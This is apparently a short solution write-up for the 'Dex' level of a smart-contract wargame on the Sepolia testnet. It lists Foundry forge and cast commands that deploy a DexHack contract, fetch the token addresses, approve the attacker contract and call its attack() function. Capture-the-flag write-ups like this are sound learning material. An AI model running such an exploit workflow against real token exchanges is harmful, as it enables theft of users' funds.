# Dex Solution

Deploy `DexHack`:

```
forge create DexHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey --constructor-args `ìnstanceAddress`
```

Retrieve `token1Address` and `token2Address`:

```
cast call `ìnstanceAddress` "token1()" --rpc-url $SEPOLIA_RPC_URL
# truncate the first 24 zeros
cast call `ìnstanceAddress` "token2()" --rpc-url $SEPOLIA_RPC_URL
# truncate the first 24 zeros
```

Approve the `dexHackAddress`:

```
cast send `token1Address` "approve(address,uint256)" `dexHackAddress` 100 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
cast send `token2Address` "approve(address,uint256)" `dexHackAddress` 100 --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

Call the `attack()` function:

```
cast send `dexHackAddress` "attack()" --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
